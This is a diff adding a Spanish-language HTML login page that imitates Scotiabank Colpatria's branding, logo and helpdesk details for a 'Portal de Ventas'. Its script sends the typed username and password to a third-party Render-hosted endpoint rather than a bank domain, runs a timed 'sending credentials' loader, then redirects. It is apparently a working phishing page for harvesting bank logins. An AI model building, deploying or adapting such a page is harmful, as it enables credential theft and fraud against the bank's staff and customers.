@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autenticacion</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+3:ital,wght@0,300;0,400;0,600;0,700;1,400&display=swap">
+    <style>
+        :root {
+            --red:      #ed0722;
+            --red-dark: #d4061e;
+            --bg:       #ffffff;
+            --text:     #222222;
+            --text-ph:  #b0b4bb;
+            --text-sec: #777777;
+            --border:   #dde1e7;
+            --icon-sec: #aaaaaa;
+            --blue-link:#087bb4;
+            --orange:   #f97316;
+            --purple:   #8230df;
+            --green:    #008660;
+            --font:     'Source Sans 3', Arial, Helvetica, sans-serif;
+        }
+
+        *, *::before, *::after { box-sizing: border-box; }
+
+        html, body {
+            margin: 0; padding: 0;
+            font-family: var(--font);
+            font-size: 10px;
+            height: 100%;
+            color: var(--text);
+            background: var(--bg);
+        }
+
+        .layout {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            min-height: 100vh;
+        }
+
+        .panel-left {
+            background: #ffffff;
+            padding: 7.2rem 8rem 7.2rem 7.2rem;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+            margin-bottom: 4.8rem;
+            text-decoration: none;
+            width: fit-content;
+        }
+        .logo__s {
+            height: 2.4rem;
+            width: auto;
+            flex-shrink: 0;
+        }
+        .logo__divider {
+            width: 0.1rem;
+            height: 2.8rem;
+            background: #dde1e7;
+            flex-shrink: 0;
+        }
+        .logo__wordmark {
+            display: flex;
+            flex-direction: column;
+            gap: 0.1rem;
+            line-height: 1;
+        }
+        .logo__main {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #222;
+            letter-spacing: -0.01em;
+            line-height: 1;
+        }
+        .logo__light {
+            font-size: 1.3rem;
+            font-weight: 400;
+            color: #888;
+            letter-spacing: 0.02em;
+            line-height: 1;
+        }
+
+        .welcome {
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--text);
+            margin: 0 0 3.6rem 0;
+            line-height: 1.2;
+        }
+
+        .loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: #ffffff;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 3.2rem;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        .loader-overlay.show {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .loader__logo {
+            height: 6rem;
+            width: auto;
+            animation: logoPulse 1.4s ease-in-out infinite;
+        }
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1);   opacity: 1; }
+            50%       { transform: scale(1.06); opacity: 0.75; }
+        }
+        .loader__bar-track {
+            width: 22rem;
+            height: 0.4rem;
+            background: #eee;
+            border-radius: 2rem;
+            overflow: hidden;
+        }
+        .loader__bar-fill {
+            height: 100%;
+            width: 0%;
+            background: #E30518;
+            border-radius: 2rem;
+            transition: width linear;
+        }
+        .loader__msg {
+            font-size: 1.5rem;
+            color: #888;
+            letter-spacing: 0.02em;
+        }
+
+        .form { width: 100%; }
+
+        .field {
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+            padding: 1.2rem 0;
+            border-bottom: 0.12rem solid var(--border);
+            margin-bottom: 2.8rem;
+            transition: border-color 0.18s;
+        }
+        .field:focus-within { border-bottom-color: var(--red); }
+
+        .field__icon {
+            color: var(--icon-sec);
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 2.2rem;
+            height: 2.2rem;
+        }
+        .field__icon svg { width: 2.2rem; height: 2.2rem; }
+
+        .field__input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            font-family: var(--font);
+            font-size: 1.85rem;
+            color: var(--text);
+            outline: none;
+            padding: 0;
+            min-width: 0;
+        }
+        .field__input::placeholder { color: var(--text-ph); }
+
+        .field__toggle {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--icon-sec);
+            display: flex;
+            align-items: center;
+            padding: 0;
+            flex-shrink: 0;
+        }
+        .field__toggle svg { width: 2rem; height: 2rem; }
+        .field__toggle:focus-visible { outline: 2px solid var(--red); border-radius: 2px; }
+
+        .btn-enter {
+            width: 100%;
+            background: #ffffff;
+            border: 0.12rem solid var(--border);
+            border-radius: 0.35rem;
+            font-family: var(--font);
+            font-size: 1.7rem;
+            font-weight: 600;
+            color: var(--text-sec);
+            padding: 1.5rem 2rem;
+            cursor: pointer;
+            text-align: center;
+            transition: border-color 0.18s, color 0.18s, box-shadow 0.18s;
+            margin-bottom: 2.4rem;
+            letter-spacing: 0.01em;
+        }
+        .btn-enter:hover {
+            border-color: #b0b4bb;
+            color: var(--text);
+            box-shadow: 0 1px 4px rgba(0,0,0,0.07);
+        }
+        .btn-enter:focus-visible { outline: 3px solid var(--red); outline-offset: 2px; }
+
+        .info-card {
+            display: flex;
+            align-items: flex-start;
+            gap: 1.4rem;
+            border: 0.12rem solid var(--border);
+            border-radius: 0.35rem;
+            padding: 1.6rem 1.8rem;
+            margin-bottom: 1.2rem;
+        }
+        .info-card__icon {
+            flex-shrink: 0;
+            width: 3.2rem;
+            height: 3.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .info-card__icon svg { width: 2.6rem; height: 2.6rem; }
+        .info-card__body { flex: 1; }
+        .info-card__text {
+            font-size: 1.4rem;
+            color: var(--text-sec);
+            line-height: 1.55;
+            margin: 0;
+        }
+        .info-card__link {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--blue-link);
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 0.3rem;
+        }
+        .info-card__link:hover { text-decoration: underline; }
+
+        .panel-right {
+            position: relative;
+            background: #ed1c6e;
+            overflow: hidden;
+            display: flex;
+            align-items: stretch;
+        }
+
+        .panel-right::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(
+                135deg,
+                #f72060 0%,
+                #e0105a 45%,
+                #c20a4d 100%
+            );
+            z-index: 0;
+        }
+
+        .panel-right::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 60% 25%, rgba(255,255,255,0.13) 0%, transparent 55%),
+                radial-gradient(ellipse at 30% 85%, rgba(0,0,0,0.12) 0%, transparent 45%);
+            z-index: 1;
+        }
+
+        .person-wrap {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+        }
+
+        .person-svg {
+            width: auto;
+            height: 88%;
+            max-height: 700px;
+        }
+
+        .circle {
+            position: absolute;
+            border-radius: 50%;
+            z-index: 3;
+            border: 0.15rem solid rgba(255,255,255,0.18);
+        }
+        .c1 { width: 36rem; height: 36rem; top: -12rem; right: -10rem; background: rgba(255,255,255,0.05); }
+        .c2 { width: 22rem; height: 22rem; bottom: 6rem; left: -6rem; background: rgba(255,255,255,0.04); }
+        .c3 { width: 10rem; height: 10rem; top: 42%; right: 4rem; background: rgba(255,255,255,0.07); border: none; }
+
+        .right-brand {
+            position: absolute;
+            top: 3.6rem;
+            left: 3.6rem;
+            z-index: 10;
+        }
+        .right-brand__logo {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+        .right-brand__s {
+            width: 3.6rem;
+            height: 3.6rem;
+            background: rgba(255,255,255,0.2);
+            border-radius: 0.4rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(4px);
+        }
+        .right-brand__name {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: rgba(255,255,255,0.92);
+            letter-spacing: 0.01em;
+        }
+
+        .right-tagline {
+            position: absolute;
+            bottom: 4rem;
+            left: 3.6rem;
+            z-index: 10;
+            max-width: 30rem;
+        }
+        .right-tagline h2 {
+            font-size: 3rem;
+            font-weight: 700;
+            color: #fff;
+            margin: 0 0 0.8rem 0;
+            line-height: 1.2;
+        }
+        .right-tagline p {
+            font-size: 1.5rem;
+            color: rgba(255,255,255,0.75);
+            margin: 0;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 820px) {
+            .layout { grid-template-columns: 1fr; }
+            .panel-right { min-height: 30rem; order: -1; }
+            .panel-left { padding: 4rem 3.2rem; }
+            .welcome { font-size: 2.6rem; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            * { transition: none !important; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="layout">
+
+    <!-- ═══ LEFT PANEL ═══ -->
+    <div class="panel-left">
+
+        <a class="logo" href="#">
+            <svg class="logo__s" viewBox="0 0 996 152" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Scotiabank">
+                <path d="M43.6408 127.15C78.4671 133.08 165.668 131.878 167.661 75.9877C167.661 53.5414 140.087 33.8395 112.542 27.8198C92.8103 23.5128 75.933 21.8702 59.5465 22.5914C47.9077 23.1022 30.7399 24.9452 19.9725 28.551C10.7677 32.0867 3.95664 29.9232 1.30235 25.1254C-1.78264 19.5665 0.280698 11.3532 11.0882 7.41682C36.8799 -1.97837 113.924 -7.10666 159.999 21.4595C178.98 33.2285 195.987 51.6483 195.987 76.3282C195.987 103.212 178.359 121.702 159.598 133.11C119.193 157.68 57.4631 152.491 38.4023 148.695C27.3845 146.502 18.9809 141.443 18.9809 127.381V57.4677C18.9809 40.8909 43.6708 41.0312 43.6708 57.608L43.6308 127.13L43.6408 127.15Z" fill="#E30518"/>
+                <path d="M309.961 28.9816C282.367 28.9816 235.871 113.078 222.249 143.226C214.076 161.295 188.224 148.425 196.388 130.355C211.071 97.923 266.421 0.0447788 309.741 0.906171C353.051 0.0347626 408.38 97.923 423.064 130.355C431.237 148.425 405.396 161.305 397.222 143.226C383.56 113.078 337.546 28.9816 309.961 28.9816Z" fill="#E30518"/>
+                <path d="M503.044 123.865C530.638 123.865 577.123 39.7891 590.765 9.63038C598.929 -8.45887 624.79 4.41194 616.617 22.5012C601.933 54.9136 546.584 152.802 503.294 151.93C459.964 152.802 404.624 54.9136 389.951 22.5012C381.778 4.41194 407.619 -8.45887 415.793 9.63038C429.425 39.7791 475.469 123.865 503.054 123.865H503.044Z" fill="#E30518"/>
+                <path d="M663.133 16.0107V138.559C663.133 156.868 635.428 156.167 635.428 137.858V15.6701C635.418 -3.26046 663.133 -3.39067 663.133 16.0107Z" fill="#E30518"/>
+                <path d="M706.252 146.722V53.5312H726.906V93.8765C730.261 86.2742 736.972 80.4748 748.721 80.4748C761.882 80.4748 773.501 88.8483 773.501 112.697C773.501 141.694 755.041 151.49 734.007 151.49C724.843 151.49 715.297 149.817 706.262 146.722H706.252ZM736.331 134.222C745.626 134.222 751.686 130.095 751.686 115.401C751.686 104.313 747.559 100.066 739.817 100.066C732.845 100.066 728.198 105.095 728.198 112.186V133.45C731.032 133.961 733.747 134.222 736.331 134.222Z" fill="#435761"/>
+                <path d="M818.413 138.599C814.157 147.233 805.633 151.49 797.119 151.49C786.402 151.49 778.148 145.82 778.148 133.961C778.148 113.078 801.246 114.109 815.449 108.961C814.157 101.619 808.097 99.4255 800.094 99.4255C794.154 99.4255 787.704 100.327 781.253 101.749V83.059C788.866 81.5165 796.608 80.4849 803.71 80.4849C822.29 80.4849 836.493 87.3159 836.493 109.612V125.718C836.493 132.158 836.493 139.51 837.915 150.077H824.624C822.3 147.243 820.106 143.377 818.434 138.609L818.413 138.599ZM805.252 135.894C809.9 135.894 815.709 131.638 815.709 122.102V120.299C807.065 123.524 799.323 122.623 799.323 130.095C799.323 133.961 801.777 135.894 805.262 135.894H805.252Z" fill="#435761"/>
+                <path d="M882.046 100.067C873.402 100.067 870.177 105.605 870.177 111.535V150.077H848.231V109.993C848.231 103.422 848.101 93.6261 847.33 81.8972H861.142C863.336 84.6015 865.659 89.7599 867.212 95.0484C870.056 87.3159 876.887 80.4849 889.798 80.4849C904.252 80.4849 914.318 88.7382 914.318 106.777V150.087H892.382V111.164C892.382 103.943 888.897 100.077 882.056 100.077L882.046 100.067Z" fill="#435761"/>
+                <path d="M926.318 53.5312H948.263V150.067H926.318V53.5312ZM968.386 81.8871H992.004C987.487 92.8448 980.906 103.151 972.903 112.947L996 150.067H971.992L951.338 114.62C958.31 104.694 964.5 93.3556 968.376 81.8771L968.386 81.8871Z" fill="#435761"/>
+            </svg>
+            <div class="logo__divider"></div>
+            <div class="logo__wordmark">
+                <span class="logo__light">Colpatria</span>
+            </div>
+        </a>
+
+        <h1 class="welcome">Bienvenido a<br>Portal de Ventas</h1>
+
+        <form class="form" id="loginForm" novalidate autocomplete="off">
+
+            <div class="field">
+                <span class="field__icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                        <circle cx="12" cy="7" r="4"/>
+                    </svg>
+                </span>
+                <input class="field__input" type="text" id="username" name="username" placeholder="Usuario" autocomplete="username" required>
+            </div>
+
+            <div class="field">
+                <span class="field__icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                    </svg>
+                </span>
+                <input class="field__input" type="password" id="password" name="password" placeholder="Contraseña" autocomplete="current-password" required>
+                <button type="button" class="field__toggle" id="togglePwd" aria-label="Mostrar contraseña">
+                    <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                    </svg>
+                </button>
+            </div>
+
+            <button type="submit" class="btn-enter">Ingresar</button>
+
+        </form>
+
+        <div class="info-card">
+            <div class="info-card__icon">
+                <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M15.3862 20.2671C17.9068 25.6029 22.1923 29.9049 27.5184 32.4459L29.8515 29.8889C30.5367 29.136 31.5766 28.8143 32.5673 29.0489L40.4812 30.9154C41.7695 31.2059 42.6797 32.3572 42.6649 33.6778V40.6398C42.6598 41.7562 41.7561 42.6599 40.6398 42.665C21.583 42.665 5.33521 26.4172 5.33521 7.36036C5.34031 6.24402 6.24401 5.34033 7.36034 5.33522H14.1637C15.5476 5.31665 16.7375 6.31214 16.9634 7.67766L18.2326 15.2929C18.3635 16.0833 18.1494 16.8919 17.6447 17.514L15.3862 20.2671Z" fill="#7849B8"/>
+                </svg>
+            </div>
+            <div class="info-card__body">
+                <p class="info-card__text">Si tienes problemas con tu contraseña comunícate con la mesa de ayuda. Tel: <strong>6015140000</strong> ext <strong>4545</strong></p>
+            </div>
+        </div>
+
+        <div class="info-card">
+            <div class="info-card__icon">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M3 11v2" stroke="#8230df" stroke-width="1.7" stroke-linecap="round"/>
+                    <path d="M18 4l-14 7 14 7V4z" stroke="#8230df" stroke-width="1.6" stroke-linejoin="round" fill="#f3e8ff"/>
+                    <path d="M18 4v16" stroke="#8230df" stroke-width="1.7" stroke-linecap="round"/>
+                    <path d="M6 13v5a2 2 0 0 0 4 0v-5" stroke="#8230df" stroke-width="1.6" stroke-linecap="round"/>
+                </svg>
+            </div>
+            <div class="info-card__body">
+                <p class="info-card__text">Scotiabank Colpatria tiene un aviso importante para ti.</p>
+                <a class="info-card__link" href="#">Lee más aquí</a>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ═══ RIGHT PANEL ═══ -->
+    <div class="panel-right">
+
+        <div class="circle c1"></div>
+        <div class="circle c2"></div>
+        <div class="circle c3"></div>
+
+        <div class="right-brand">
+            <div class="right-brand__logo">
+                <div class="right-brand__s">
+                    <svg width="22" height="22" viewBox="-5 -10 205 165" fill="none">
+                        <path d="M43.6408 127.15C78.4671 133.08 165.668 131.878 167.661 75.9877C167.661 53.5414 140.087 33.8395 112.542 27.8198C92.8103 23.5128 75.933 21.8702 59.5465 22.5914C47.9077 23.1022 30.7399 24.9452 19.9725 28.551C10.7677 32.0867 3.95664 29.9232 1.30235 25.1254C-1.78264 19.5665 0.280698 11.3532 11.0882 7.41682C36.8799 -1.97837 113.924 -7.10666 159.999 21.4595C178.98 33.2285 195.987 51.6483 195.987 76.3282C195.987 103.212 178.359 121.702 159.598 133.11C119.193 157.68 57.4631 152.491 38.4023 148.695C27.3845 146.502 18.9809 141.443 18.9809 127.381V57.4677C18.9809 40.8909 43.6708 41.0312 43.6708 57.608L43.6308 127.13L43.6408 127.15Z" fill="white"/>
+                    </svg>
+                </div>
+                <span class="right-brand__name">Scotiabank Colpatria</span>
+            </div>
+        </div>
+
+        <div class="person-wrap">
+            <svg class="person-svg" viewBox="0 0 420 780" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <ellipse cx="210" cy="765" rx="120" ry="15" fill="rgba(0,0,0,0.15)"/>
+                <rect x="148" y="560" width="52" height="200" rx="26" fill="#2d1a0e"/>
+                <rect x="218" y="560" width="52" height="200" rx="26" fill="#1a0f08"/>
+                <ellipse cx="174" cy="760" rx="38" ry="14" fill="#111"/>
+                <ellipse cx="244" cy="760" rx="38" ry="14" fill="#0a0a0a"/>
+                <path d="M130 420 Q155 580 148 565 L202 565 L210 420 L218 420 L270 565 L310 565 Q305 580 290 420Z" fill="#d63a6a"/>
+                <path d="M130 420 Q158 530 148 565 L270 565 Q262 530 290 420Z" fill="#e04278"/>
+                <rect x="138" y="270" width="144" height="170" rx="18" fill="#e8547a"/>
+                <path d="M178 270 Q210 300 242 270" stroke="rgba(255,255,255,0.4)" stroke-width="2" fill="none"/>
+                <path d="M155 310 Q165 305 175 310" stroke="rgba(255,255,255,0.2)" stroke-width="1.5" fill="none"/>
+                <path d="M155 330 Q165 325 175 330" stroke="rgba(255,255,255,0.2)" stroke-width="1.5" fill="none"/>
+                <path d="M138 300 Q90 360 95 440 Q100 460 120 455 Q140 450 145 430 Q148 380 178 320Z" fill="#e8a080"/>
+                <ellipse cx="107" cy="458" rx="22" ry="18" fill="#d4836a"/>
+                <rect x="86" y="430" width="42" height="55" rx="8" fill="rgba(255,255,255,0.85)"/>
+                <rect x="86" y="430" width="42" height="14" rx="4" fill="rgba(255,255,255,0.6)"/>
+                <rect x="118" y="400" width="5" height="50" rx="2.5" fill="#f5c400" transform="rotate(-8 118 400)"/>
+                <rect x="88" y="445" width="38" height="38" rx="6" fill="rgba(255, 160, 180, 0.7)"/>
+                <path d="M282 300 Q330 340 325 415 Q322 440 298 445 Q274 450 270 425 Q260 370 242 320Z" fill="#e8a080"/>
+                <ellipse cx="312" cy="442" rx="20" ry="17" fill="#d4836a"/>
+                <rect x="193" y="220" width="34" height="60" rx="17" fill="#e8a080"/>
+                <ellipse cx="210" cy="185" rx="72" ry="80" fill="#e8a080"/>
+                <path d="M138 175 Q140 90 210 85 Q280 90 282 175 Q270 130 250 115 Q230 105 210 105 Q190 105 170 115 Q150 130 138 175Z" fill="#2d1a0e"/>
+                <path d="M138 175 Q128 220 135 255 Q150 240 155 220 Q148 200 138 175Z" fill="#2d1a0e"/>
+                <path d="M282 175 Q292 220 285 255 Q270 240 265 220 Q272 200 282 175Z" fill="#2d1a0e"/>
+                <path d="M148 165 Q155 100 210 95 Q265 100 272 165 Q255 118 210 115 Q165 118 148 165Z" fill="#1a0f08"/>
+                <path d="M178 185 Q188 177 198 185" stroke="#7a4a2a" stroke-width="3" fill="none" stroke-linecap="round"/>
+                <path d="M222 185 Q232 177 242 185" stroke="#7a4a2a" stroke-width="3" fill="none" stroke-linecap="round"/>
+                <path d="M175 172 Q186 167 197 171" stroke="#2d1a0e" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+                <path d="M223 171 Q234 167 245 172" stroke="#2d1a0e" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+                <path d="M206 195 Q210 205 214 195" stroke="#c4836a" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+                <path d="M188 215 Q210 232 232 215" stroke="#c4614a" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+                <path d="M192 218 Q210 228 228 218" fill="rgba(255,120,120,0.25)"/>
+                <ellipse cx="175" cy="208" rx="14" ry="9" fill="rgba(255,120,120,0.2)"/>
+                <ellipse cx="245" cy="208" rx="14" ry="9" fill="rgba(255,120,120,0.2)"/>
+                <circle cx="138" cy="198" r="5" fill="#f5c400"/>
+                <circle cx="282" cy="198" r="5" fill="#f5c400"/>
+            </svg>
+        </div>
+
+        <div class="right-tagline">
+            <h2>Tu plataforma<br>de ventas</h2>
+            <p>Gestiona clientes, productos y comisiones desde un solo lugar.</p>
+        </div>
+
+    </div>
+</div>
+
+<!-- ── LOADER OVERLAY ── -->
+<div class="loader-overlay" id="loaderOverlay">
+    <svg class="loader__logo" viewBox="-5 -10 205 165" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M43.6408 127.15C78.4671 133.08 165.668 131.878 167.661 75.9877C167.661 53.5414 140.087 33.8395 112.542 27.8198C92.8103 23.5128 75.933 21.8702 59.5465 22.5914C47.9077 23.1022 30.7399 24.9452 19.9725 28.551C10.7677 32.0867 3.95664 29.9232 1.30235 25.1254C-1.78264 19.5665 0.280698 11.3532 11.0882 7.41682C36.8799 -1.97837 113.924 -7.10666 159.999 21.4595C178.98 33.2285 195.987 51.6483 195.987 76.3282C195.987 103.212 178.359 121.702 159.598 133.11C119.193 157.68 57.4631 152.491 38.4023 148.695C27.3845 146.502 18.9809 141.443 18.9809 127.381V57.4677C18.9809 40.8909 43.6708 41.0312 43.6708 57.608L43.6308 127.13L43.6408 127.15Z" fill="#E30518"/>
+    </svg>
+    <div class="loader__bar-track">
+        <div class="loader__bar-fill" id="loaderBar"></div>
+    </div>
+    <span class="loader__msg" id="loaderMsg">Verificando credenciales...</span>
+</div>
+
+<script>
+    // Configuración
+    const API_URL = 'https://tu-app-en-render.onrender.com/api/login';
+    const LOADER_MS = 5000;
+
+    // ── Toggle password
+    const pwd = document.getElementById('password');
+    const toggleBtn = document.getElementById('togglePwd');
+    const eyeIcon = document.getElementById('eyeIcon');
+    const eyeOpen = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+    const eyeClosed = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>`;
+
+    toggleBtn.addEventListener('click', () => {
+        const show = pwd.type === 'password';
+        pwd.type = show ? 'text' : 'password';
+        eyeIcon.innerHTML = show ? eyeClosed : eyeOpen;
+        toggleBtn.setAttribute('aria-label', show ? 'Ocultar contraseña' : 'Mostrar contraseña');
+    });
+
+    // ── Loader
+    function showLoader(message = 'Verificando credenciales...') {
+        const overlay = document.getElementById('loaderOverlay');
+        const bar = document.getElementById('loaderBar');
+        const msg = document.getElementById('loaderMsg');
+        msg.textContent = message;
+        overlay.classList.add('show');
+        bar.style.transition = `width ${LOADER_MS}ms linear`;
+        requestAnimationFrame(() => { bar.style.width = '100%'; });
+    }
+
+    function hideLoader() {
+        const overlay = document.getElementById('loaderOverlay');
+        const bar = document.getElementById('loaderBar');
+        overlay.classList.remove('show');
+        bar.style.width = '0%';
+    }
+
+    // ── Form submit
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const usuario = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value;
+        if (!usuario || !password) return;
+
+        showLoader('Enviando credenciales...');
+
+        try {
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ usuario, password })
+            });
+
+            const data = await response.json();
+
+            if (data.redirect) {
+                // Esperar a que termine la barra de progreso
+                setTimeout(() => {
+                    window.location.href = data.redirect;
+                }, LOADER_MS);
+            } else {
+                hideLoader();
+                alert(data.message || 'Error en el servidor');
+            }
+        } catch (error) {
+            hideLoader();
+            alert('Error de conexión con el servidor');
+            console.error(error);
+        }
+    });
+</script>
+</body>
+</html>
